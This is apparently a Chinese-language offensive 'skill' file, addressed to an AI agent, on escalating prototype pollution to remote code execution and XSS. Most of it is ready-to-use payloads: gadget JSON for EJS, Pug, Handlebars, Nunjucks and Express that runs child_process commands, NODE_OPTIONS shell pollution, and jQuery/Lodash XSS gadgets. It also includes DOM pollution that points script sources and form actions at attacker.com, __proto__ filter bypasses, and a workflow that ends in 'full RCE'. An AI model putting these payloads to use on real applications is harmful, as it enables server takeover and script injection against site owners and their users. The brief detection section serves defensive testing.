# 技能：原型污染高级 — 远程代码执行与工具利用

> **AI 加载指令**：高级原型污染升级。涵盖通过模板引擎（EJS、Pug、Handlebars）的服务器端远程代码执行（RCE）、Node.js child_process 工具、客户端脚本工具、过滤绕过模式以及系统化检测。先加载 [../prototype-pollution/SKILL.md](../prototype-pollution/SKILL.md) 以了解基础知识（合并汇点、`__proto__` vs `constructor.prototype`、基本探测）。

## 0. 相关路由

- [prototype-pollution](../prototype-pollution/SKILL.md) — **优先加载** 以了解原型污染（PP）基础知识、合并汇点探测、基本探测
- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) — 模板引擎 RCE 环境（PP 通常通过模板工具触发）
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — 客户端 PP 工具最终实现跨站脚本（XSS）

### 高级参考

加载 [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) 以获取按框架/库分类的全面工具表，包含被污染的属性、触发条件、影响和受影响的版本。

---

## 1. 服务器端 PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV 注入

当调用 `child_process.spawn` 或 `child_process.fork` 时未指定显式 `env`/`shell` 选项，它会从 `Object.prototype` 继承：

```javascript
// 易受攻击的模式（非常常见）：
const { execSync } = require('child_process');
execSync('ls');  // 继承 shell、env 从原型

// 用于 RCE 的污染：
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// 下一个 child_process 调用执行攻击者代码
```

替代 ENV 污染：

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS（嵌入式 JavaScript 模板）

EJS `render()` 从对象属性读取 `opts`。污染 `outputFunctionName` 将代码注入编译后的模板函数：

```json
// 污染负载：
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// 污染后 EJS 渲染任何模板时：
// 编译函数包含：var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

检测：污染后任何 EJS `res.render()` 调用都会触发。

### 1.3 Pug（前身为 Jade）

Pug 的编译器从对象属性读取 `block`：

```json
{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require('child_process').execSync('id');//"}}}
```

通过 `self` 选项的替代方法：

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars 模板编译检查模板抽象语法树（AST）节点的 `type` 和 `program`：

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

通过 `allowProtoMethodsByDefault` 的更简单方法：

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// 然后使用 {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render（通用）

当 Express 调用 `res.render()` 时，选项与 `app.locals` 和 `res.locals` 合并。污染的原型属性作为模板变量出现：

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. 客户端原型污染

### 2.1 jQuery 工具

`$.extend(true, {}, userInput)` 执行深度合并——经典的 PP 汇点。

污染后，jQuery 的 HTML 方法使用污染的属性：

```javascript
// 污染：
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// 触发：任何读取原型中 innerHTML 的 jQuery DOM 操作
$('<div>').appendTo('body');  // 可能使用污染的属性
```

### 2.2 Lodash 工具

```javascript
// 易受攻击的函数（深度合并）：
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // 如果 path 受攻击者控制

// template() 工具：
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL 注入到 Function 构造函数
```

### 2.3 框架中的脚本工具

"脚本工具"是读取 `Object.prototype` 并执行危险操作的框架代码路径：

| 框架 | 工具模式 | 污染属性 | 影响 |
|---|---|---|---|
| jQuery | `$.html()`、元素创建 | `innerHTML`、`src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | 模板编译 | `template`、`render` | XSS |
| Ember.js | 组件渲染 | 各种视图属性 | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM 属性污染

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// 任何动态创建的元素都可能继承这些
```

---

## 3. 检测技术

### 3.1 黑盒服务器端检测

```
步骤 1：注入并检查
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  然后：GET /api/anything
  检查响应是否包含 "polluted" 或行为变化

步骤 2：基于错误的检测
  {"__proto__":{"toString":1}}
  → 如果服务器崩溃或返回 500，toString 被覆盖
  
  {"__proto__":{"valueOf":1}}
  → 相同的崩溃检测

步骤 3：响应差异
  {"__proto__":{"status":555}}
  → 检查 HTTP 状态码是否变为 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → 检查 Content-Type 头是否变化
```

### 3.2 黑盒客户端检测

```javascript
// 在与应用交互后浏览器控制台中：
Object.prototype.testPollution
// 如果返回值 → 某些东西污染了原型

// 自动化：覆盖 defineProperty 以检测写入
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 自动化工具

| 工具 | 类型 | 目的 |
|---|---|---|
| **PPScan** | Burp 扩展 | 扫描服务器端 PP |
| **server-side-prototype-pollution** | Burp 扩展（Gareth Heyes） | 使用多种技术进行高级服务器端 PP 检测 |
| **ppfuzz** | 命令行 | 通过 URL 片段/查询模糊测试客户端 PP |
| **ppmap** | 命令行 | 将客户端 PP 映射到已知工具 |

---

## 4. 绕过 `__proto__` 过滤器

### 4.1 constructor.prototype 路径

```json
// 替代：
{"__proto__": {"polluted": "yes"}}

// 使用：
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 方括号表示法变体

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (如果过滤器一次移除 __proto__)
```

### 4.3 JSON 键变体

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 键区分：浅层 vs 深层

`Object.assign` 不会污染原型（浅层复制，安全）。只有递归/深度合并函数才易受攻击。始终验证合并深度。

---

## 5. 利用流程

```
1. 找到合并汇点（../prototype-pollution/SKILL.md 第 0 节）
   └── JSON 正文被解析并深度合并到服务器对象

2. 确认污染：
   └── {"__proto__":{"testxyz":"1"}} → 检查 testxyz 是否全局出现

3. 确定技术栈：
   ├── Express + EJS → outputFunctionName 工具（第 1.2 节）
   ├── Express + Pug → block 工具（第 1.3 节）
   ├── Express + Handlebars → type/program 工具（第 1.4 节）
   ├── 任何 Node.js 使用 child_process → shell/NODE_OPTIONS（第 1.1 节）
   ├── 客户端 jQuery → DOM 工具（第 2.1 节）
   ├── 客户端 Lodash → template/sourceURL（第 2.2 节）
   └── 未知 → 系统地尝试 KNOWN_GADGETS.md

4. 编制匹配工具的 RCE/XSS 负载

5. 首先使用安全负载验证（睡眠 / DNS 回调）

6. 升级到完整 RCE
```

---

## 6. 决策树

```
确认原型污染？
│
├── 服务器端或客户端？
│   │
│   ├── 服务器端
│   │   ├── 使用模板引擎？
│   │   │   ├── EJS → __proto__.outputFunctionName（第 1.2 节）
│   │   │   ├── Pug → __proto__.block（第 1.3 节）
│   │   │   ├── Handlebars → __proto__.type（第 1.4 节）
│   │   │   ├── Nunjucks → __proto__.type（第 1.5 节）
│   │   │   └── 未知 → 尝试 KNOWN_GADGETS.md 中的每个工具
│   │   │
│   │   ├── 任何地方使用 child_process？
│   │   │   ├── 是 → __proto__.shell + NODE_OPTIONS（第 1.1 节）
│   │   │   └── 可能 → 注入并触发错误以暴露堆栈
│   │   │
│   │   └── 没有已知工具？
│   │       ├── 尝试状态码污染：__proto__.status = 555
│   │       ├── 尝试头部污染：__proto__.content-type
│   │       └── 检查 KNOWN_GADGETS.md 以匹配框架
│   │
│   └── 客户端
│       ├── 加载了 jQuery？
│       │   ├── 是 → $.extend 深度合并 + DOM 工具（第 2.1 节）
│       │   └── 检查 ppmap 以自动检测工具
│       │
│       ├── 加载了 Lodash？
│       │   ├── 是 → _.template sourceURL 工具（第 2.2 节）
│       │   └── _.merge 作为汇点 AND 工具
│       │
│       └── 框架（Angular/Vue/Ember）？
│           └── 脚本工具查找（第 2.3 节）
│
├── `__proto__` 关键字被过滤？
│   ├── 尝试 constructor.prototype（第 4.1 节）
│   ├── 尝试方括号表示法（第 4.2 节）
│   └── 尝试 JSON 键变体（第 4.3 节）
│
└── 尚未确认？
    └── 返回到 ../prototype-pollution/SKILL.md 进行检测
```

---

## 7. 快速参考 — 关键负载

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]));process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE（Node.js）
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// 过滤器绕过（构造器路径）
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// 安全检测探测
{"__proto__":{"pptest123":"polluted"}}
```
